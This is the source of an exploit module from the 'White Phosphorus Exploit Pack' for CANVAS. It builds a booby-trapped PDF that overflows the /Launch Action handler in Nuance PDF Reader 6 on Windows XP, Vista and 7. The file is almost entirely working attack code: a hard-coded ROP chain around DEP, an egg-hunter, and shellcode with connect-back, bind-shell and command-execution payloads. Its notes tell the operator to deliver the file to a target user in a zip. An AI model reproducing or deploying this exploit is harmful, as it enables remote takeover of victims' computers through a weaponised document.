
#! /usr/bin/env python
######################################################################################
# White Phosphorus Exploit Pack
#
# Proprietary source code - use only under the license agreement in distribution
#
######################################################################################


#Standard Imports
import sys 
sys.path.append(".")
sys.path.append("3rdparty/White_Phosphorus/libs")

import os
import socket
import sys
import time
from struct import *

# CANVAS modules
from wp_exploit import *
from wp_dialog import *
from wp_osversions import *
from exploitutils import *
from tcpexploit import *
from httpclientside import httpclientside


######################################################################################
NAME = "Nuance PDF Reader /Launch Action Clientside Overflow"
DESCRIPTION = "Clientside overflow in the /Launch Action of Nuance PDF Reader 6"
VERSION = "1.0"
DOCUMENTATION = {}
DOCUMENTATION['VENDOR']='Nuance'
DOCUMENTATION["Date public"] = "2010-10-08"
DOCUMENTATION["References"] = "http://osvdb.org/show/osvdb/68514"
DOCUMENTATION["Repeatability"] = "Unlimited"                            
DOCUMENTATION['CVE'] = "N/A"
DOCUMENTATION['CVE Url'] = 'N/A'                        
DOCUMENTATION['Notes']="""
Run the module and send the created file to the target user. The file needs to be opened directly in Nuance, so delivery is probably best via a .zip file.
"""

# Targets
PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Clientside"
PROPERTY['ARCH'] = [ ["Windows"] ]
PROPERTY['VERSION'] = [ "XP", "Vista", "7" ]

NOTES="""
WP> White Phosphorus Exploit Pack
WP> Nuance PDF Reader /Launch Action Clientside Overflow
---------------------------------------------------------------------
Usage:
-T (check if target is vulnerable)
-v <version to target>
-t <target ip>   -p <target port>
-l <callback ip> -d <callback port>
-F <filename>

Payload Options:
-O payload:<#>   (will use default if not specified)
-O command:<cmd> (for Execute Command payload)
-O bind:<port>   (for Bind MOSDEF Shell)

Versions:
0: Windows Vista/7
1: Windows XP

Payloads:
0: TCP Connect Back
1: IE Inject Connect Back
2: Bind MOSDEF Shell
3: Execute Command

Example:
./commandlineInterface.py -p 5555 -v 17
./3rdparty/White_Phosphorus/exploits/wp_nuance_pdf_reader_launch/wp_nuance_pdf_reader_launch.py  -v 0 -t 10.1.1.10 -l 10.1.1.1 -d 5555 -O payload:0
"""

PORT = 0
######################################################################################

# Dialog Hooks
def dialog_update(gtk, wt):
    wp_dialog_update(gtk, wt, theexploit, targets, PORT)
    return

targets = {
    0 : ["Windows Vista / 7", (0x00000000, 0x00000000, 0x0000), [WINVISTA, WIN7]],
    1 : ["Windows XP", (0x00000000, 0x00000000, 0x0000), [WINXPSP2, WINXPSP3]]
}


class theexploit(wp_exploit,httpclientside):
    ######################################################################################
    ## WP> Dialog Information
    ##########################s############################################################
    PAYLOADS=["TCP Connect Back",
              "IE Inject Connect Back",
              "Bind MOSDEF Shell",
              "Execute Command"]
              
    DEFAULT_PAYLOAD = 1

    def __init__(self):
        wp_exploit.__init__(self)
        httpclientside.__init__(self)
        self.setInfo(DESCRIPTION)
        self.setInfo(VERSION)
        self.name = NAME
        self.targets = targets
        self.version = 0
        self.isClientD = False
        self.use_universal = True
        self.suspendThreads=True
        self.createThread = False
        self.badstring = "\x00\x2f\x5c\x0a\x0d\x0a\x0d\x22\x28\x29\x3c\x3e"
        self.filename="".join( [ random.choice(string.uppercase) for x in range(8) ] ) + '.pdf'
        return
    
    def usage(self):
        self.wp_usage(targets,"-F <filename>")
        return        
        
    def displayVersions(self):
        for t in targets.keys():
            print 'WP> Version %d: %s'%(t,targets[t][0])
        return      
        
    def neededListenerTypes(self):
        # We use this function to grab different shellcode type and os types
        self.getArgs()

        return self.wp_createWin32Listener()

    def createShellcode(self):
        # We use this function to grab different shellcode type and os types
        self.getArgs()

        self.log('WP> Targeting version %d: %s'%(self.version,targets[self.version][0]))
        return self.wp_createShellcode()    
    
    def getArgs(self):
        # Selected shell options
        self.wp_getShellcodeType()

        # If called from clientD there will be no target here
        if self.target:
            self.host=self.target.interface
        self.filename=self.argsDict.get('filename',self.filename)
                   
        return 
    
    def depBypass(self):
        depBypass = pack('<L', 0x1004453D) # push esp / pop edi
        depBypass += pack('<L', 0x1006E73F) # xchg eax, edi
        depBypass += pack('<L', 0x1023b5b5) # add eax, 60
        depBypass += pack('<L', 0x1004453D) # push esp / pop edi
        depBypass += pack('<L', 0x1006E73F) # xchg eax, edi
        depBypass += pack('<L', 0x1009b3f1) # stosd
        depBypass += pack('<L', 0x10211104) # pop eax
        depBypass += pack('<L', 0xFFFFEFFF)
        depBypass += pack('<L', 0x10059DCE) # neg eax
        depBypass += pack('<L', 0x1003996B) # dec eax
        depBypass += pack('<L', 0x1009B3F1) # stosd
        depBypass += pack('<L', 0x1009B3F1) # stosd
        depBypass += pack('<L', 0x10059577) # xor eax, eax
        depBypass += pack('<L', 0x1023b595) # add eax, 40
        depBypass += pack('<L', 0x1009B3F1) # stosd
        depBypass += pack('<L', 0x1006E73F) # xchg eax, edi
        depBypass += pack('<L', 0x100616BE) # xchg eax,ebp
        depBypass += pack('<L', 0x10211104) # pop eax
        depBypass += pack('<L', 0x1023C20C) # VirtualAlloc
        depBypass += pack('<L', 0x10051D08) # mov eax, [eax]
        depBypass += pack('<L', 0x10044587) # retn
        depBypass += pack('<L', 0x10044587) # retn
        depBypass += pack('<L', 0x10044587) # retn
        depBypass += pack('<L', 0x10044587) # retn
        depBypass += pack('<L', 0x10050ACE) # call eax / ret
        depBypass += pack('<L', 0x61616161)
        depBypass += pack('<L', 0x61616161)
        depBypass += pack('<L', 0x61616161)
        depBypass += pack('<L', 0x61616161)
        depBypass += pack('<L', 0x10045369) # push esp / ret
        return depBypass
	
    def makefile(self):
        if self.version == 1:
            searchcode = wp_SearchCode(False)
            tagSc = 'c00kc00k' + self.shellcode + "B"*100
        else:
            searchcode = wp_SearchCode(True)
            depBypass = self.depBypass()
            tagSc = 'c00kc00k' + depBypass + wp_AlignStack() + self.shellcode + "B"*100
        
        filedata = "%PDF-1.4\n"
        filedata +="1 0 obj\n"
        filedata +="<</Type/Page/Parent 4 0 R /Resources 6 0 R /MediaBox[ 0 0 000 000]"
        filedata +="/Group<</S/Transparency/CS/DeviceRGB/I true>>/Contents 2 0 R "
        filedata +="/Annots[ 24 0 R  25 0 R  9 0 R ]>>\n"
        filedata +="endobj\n"
        filedata +="4 0 obj\n"
        filedata +="<</Type/Pages/Resources 6 0 R /MediaBox[ 0 0 000 000]/Kids[ 1 0 R ]/Count 1>>\n"
        filedata +="endobj\n"
        filedata +="7 0 obj\n"
        filedata +="<</Type/Catalog/Pages 4 0 R /OpenAction[ 1 0 R /XYZ null null 0]/Lang(en-US)/Names 28 0 R >>\n"
        filedata +="endobj\n"
        filedata +="9 0 obj\n"
        filedata +="<</Type/Annot/Subtype/Screen/P 1 0 R /M(E:000000000000000-00'00')/F 4/Rect[ "
        filedata +="000.000 000.000 000.000 000.000]/BS<</S/S/W 1>>/BE<</S/S>>/MK<</BC[ 0 0 1]"
        filedata +="/R 0/IF<</SW/A/S/A/FB false/A[ 0.5 0.5]>>>>/AP<</N 10 0 R >>/T()/A 12 0 R /AA 17 0 R >>\n"
        filedata +="endobj\n"
        filedata +="16 0 obj\n"
        filedata +="<</Type/Action/S/Launch/F<</F(/C/"
        if self.version == 1:
            filedata +='\x01'*1290
            filedata += "\xeb\x06\x90\x90"
            filedata += pack('<L', 0x1003C8E1)
            filedata += searchcode
        else:
            filedata +='\x48'*1290
            filedata += wp_randomstring(4)
            filedata += pack('<L', 0x10011EE7) # add esp, 4658
            filedata += "B"*87
            filedata += pack('<L', 0x10044587)*10
            filedata += depBypass
            # Add ACSBypass (Activation Context Stack)
            #33C0                 XOR EAX,EAX
            #66:B8 A801           MOV AX,1A8
            #64:8B38              MOV EDI,DWORD PTR FS:[EAX]
            #33C0                 XOR EAX,EAX
            #AB                   STOS DWORD PTR ES:[EDI]
            filedata +="\x33\xc0\x66\xb8\xa8\x01\x64\x8b\x38\x33\xc0\xab"  
            filedata += searchcode
        filedata += wp_randomstring(1000)
        filedata += tagSc
        filedata += wp_randomstring(6000)
        filedata += ")>>/NewWindow true>>\n"
        filedata += "endobj\n"
        filedata += "17 0 obj\n"
        filedata += "<</PV 16 0 R >>\n"
        filedata += "endobj\n"
        filedata += "trailer\n"
        filedata += "<</Root 7 0 R /Info 8 0 R /ID[<00000000000000000000000000000000><00000000000000000000000000000000>]"
        filedata += "/DocChecksum/00000000000000000000000000000000/Size 31>>\n"
        filedata += "startxref\n"
        filedata += "0000\n"
        filedata += "%%EOF\n"
        return filedata

    def run(self):
        filedata=self.makefile()
        self.log("WP> Opening %s for output"%(self.filename))
        
        fd=file(self.filename,'wb+')
        fd.write(filedata)
        fd.close()
        self.log('WP> Wrote to %s'%(self.filename))
        return 1

if __name__== '__main__':
    print 'WP> Running White Phosphorus %s Exploit v %s'%(NAME,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)
    if ret not in [0,1,None]:
        ret.interact()
